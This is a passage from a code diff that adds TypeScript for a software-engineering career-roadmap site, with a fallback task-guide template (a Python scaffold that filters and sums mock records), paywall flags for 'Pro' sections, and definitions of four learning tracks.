+      expectedOutput: `System Design Specification Complete:
+- Quantitative scale estimates: 230 QPS average, 700 QPS peak, 14.6 TB/year storage
+- Multi-tier architecture diagram mapping cache-aside and read replica flows
+- High-availability failure mode mitigations documented`,
+      checklist: [
+        "Computes realistic capacity and throughput figures",
+        "Specifies caching strategy and database replication topology",
+        "Includes concrete failure mitigation strategies",
+        "Covers functional and non-functional requirements"
+      ]
+    };
+  }
+
+  // 6. DEFAULT GENERAL FALLBACK (PYTHON / AUTOMATION)
+  return {
+    conceptPrimer: `To complete this task, you need a clear mental model of ${task.title}.\n- Modularity: Isolate inputs, business transformation, and outputs into distinct functions.\n- Defensive Programming: Validate input schemas, handle null values, and log execution timing.\n- Verification: Always assert that the actual output matches the client's expected contract.`,
+    scenario: `Enterprise Client Engagement: The client operations team requires a robust, self-contained implementation of "${task.title}". The deliverable must execute with clear outputs and zero unhandled exceptions within an estimated ${task.est}.`,
+    starterSnippet: `# Starter Scaffold for: ${task.title}
+# Run locally with: python3 script.py
+
+import json
+import sys
+import time
+
+# Sample Mock Input Data for this task
+MOCK_INPUT = {
+    "task_id": "${task.id}",
+    "client": "Enterprise Partner A",
+    "status": "pending",
+    "records": [
+        {"id": 1, "value": 100, "valid": True},
+        {"id": 2, "value": 250, "valid": True},
+        {"id": 3, "value": -10, "valid": False}
+    ]
+}
+
+def execute_pipeline(data):
+    print(f"Processing task: ${task.title}...")
+    # Step 1: Validate input
+    # Step 2: Transform valid records
+    # Step 3: Compute summary
+    return {"status": "success", "processed_count": 0}
+
+if __name__ == "__main__":
+    result = execute_pipeline(MOCK_INPUT)
+    print("Result:", json.dumps(result, indent=2))`,
+    steps: [
+      `1. Setup: Copy the starter scaffold into your IDE or editor and run it to verify execution.`,
+      `2. Data Validation: Filter out corrupted or invalid records using strict conditionals.`,
+      `3. Core Logic: Implement the business logic for ${task.title} with clean separation of concerns.`,
+      `4. Output & Verification: Format the output and compare your console logs with the expected terminal output below.`
+    ],
+    solutionSnippet: `# Production Implementation: ${task.title}
+import json
+import sys
+import time
+
+def process_records(input_data):
+    start_time = time.time()
+    
+    if not isinstance(input_data, dict) or "records" not in input_data:
+        raise ValueError("Invalid schema: 'records' field is required.")
+        
+    valid_items = []
+    total_val = 0
+    
+    for item in input_data["records"]:
+        # Defensive validation
+        if item.get("valid") is True and item.get("value", 0) > 0:
+            valid_items.append(item)
+            total_val += item["value"]
+            
+    execution_ms = round((time.time() - start_time) * 1000, 2)
+    
+    return {
+        "task_name": "${task.title}",
+        "status": "completed",
+        "total_records": len(input_data["records"]),
+        "valid_records_count": len(valid_items),
+        "aggregated_sum": total_val,
+        "execution_time_ms": execution_ms
+    }
+
+if __name__ == "__main__":
+    mock_data = {
+        "client": "Enterprise Partner A",
+        "records": [
+            {"id": 1, "value": 100, "valid": True},
+            {"id": 2, "value": 250, "valid": True},
+            {"id": 3, "value": -10, "valid": False}
+        ]
+    }
+    output = process_records(mock_data)
+    print("=== PIPELINE EXECUTION SUCCESSFUL ===")
+    print(json.dumps(output, indent=2))`,
+    solutionExplanation: `This solution establishes defensive schema validation, filters invalid entries, aggregates metrics, tracks execution timing in milliseconds, and prints a structured JSON response.`,
+    expectedOutput: `=== PIPELINE EXECUTION SUCCESSFUL ===
+{
+  "task_name": "${task.title}",
+  "status": "completed",
+  "total_records": 3,
+  "valid_records_count": 2,
+  "aggregated_sum": 350,
+  "execution_time_ms": 0.12
+}`,
+    checklist: [
+      "Runs locally with zero external package dependencies",
+      "Correctly filters out invalid records (valid == False or value <= 0)",
+      "Computes the aggregated sum accurately (350)",
+      "Outputs formatted JSON with execution timing metrics"
+    ]
+  };
+}
+
+// Tag Pro sections for granular roadmap gating
+const PRO_SECTION_IDS = new Set([
+  'data-eng',
+  'cloud',
+  'security',
+  'ml-ai',
+  'observability',
+  'sys-design',
+  'consulting',
+  'domain',
+]);
+
+ROADMAP_SECTIONS.forEach((sec) => {
+  sec.isPro = PRO_SECTION_IDS.has(sec.id);
+  sec.tasks.forEach((task) => {
+    task.isPro = sec.isPro;
+  });
+  sec.topics.forEach((topic) => {
+    topic.isPro = sec.isPro;
+  });
+});
+
+export const ALL_ROADMAPS: RoadmapDefinition[] = [
+  {
+    id: 'fde-flagship',
+    slug: 'forward-deployed-engineer',
+    title: 'Forward Deployed Engineer (Complete Career Path)',
+    tagline: 'The end-to-end curriculum for Palantir, Scale AI, and Databricks style client-embedded software engineering.',
+    icon: '🎯',
+    badge: 'Flagship Curriculum',
+    category: 'flagship',
+    totalMilestones: 21,
+    estimatedWeeks: 24,
+    tier: 'hybrid',
+    sections: ROADMAP_SECTIONS,
+  },
+  {
+    id: 'data-engineering',
+    slug: 'data-engineering',
+    title: 'Enterprise Data Pipelines & Resilient ETL',
+    tagline: 'Master batch, streaming, idempotent deduplication, data warehousing, and client telemetry.',
+    icon: '⚡',
+    badge: 'Specialization Path',
+    category: 'data',
+    totalMilestones: 5,
+    estimatedWeeks: 8,
+    tier: 'hybrid',
+    sections: ROADMAP_SECTIONS.filter((s) => ['databases', 'data-eng', 'apis', 'cloud', 'observability'].includes(s.id)),
+  },
+  {
+    id: 'ai-agents',
+    slug: 'ai-agents',
+    title: 'Generative AI, Production RAG & Tool-Calling Agents',
+    tagline: 'Build air-gapped semantic search, vector embeddings, evaluations, and agent workflows for enterprise clients.',
+    icon: '🤖',
+    badge: 'AI Specialization',
+    category: 'ai',
+    totalMilestones: 5,
+    estimatedWeeks: 6,
+    tier: 'pro',
+    sections: ROADMAP_SECTIONS.filter((s) => ['python', 'apis', 'ml-ai', 'sys-design', 'security'].includes(s.id)),
+  },
+  {
+    id: 'cloud-sre',
+    slug: 'cloud-devops',
+    title: 'Cloud Infrastructure, Containers & Production SRE',
+    tagline: 'Multi-stage Docker, Kubernetes clusters, CI/CD quality gates, and distributed observability on client VPCs.',
+    icon: '☁️',
+    badge: 'DevOps & SRE',
+    category: 'cloud',
+    totalMilestones: 5,
+    estimatedWeeks: 7,
+    tier: 'pro',
+    sections: ROADMAP_SECTIONS.filter((s) => ['cli-os', 'networking', 'cloud', 'security', 'observability'].includes(s.id)),
+  },
+];
+
+export { TASK_DETAILS, getTaskGuide };
+
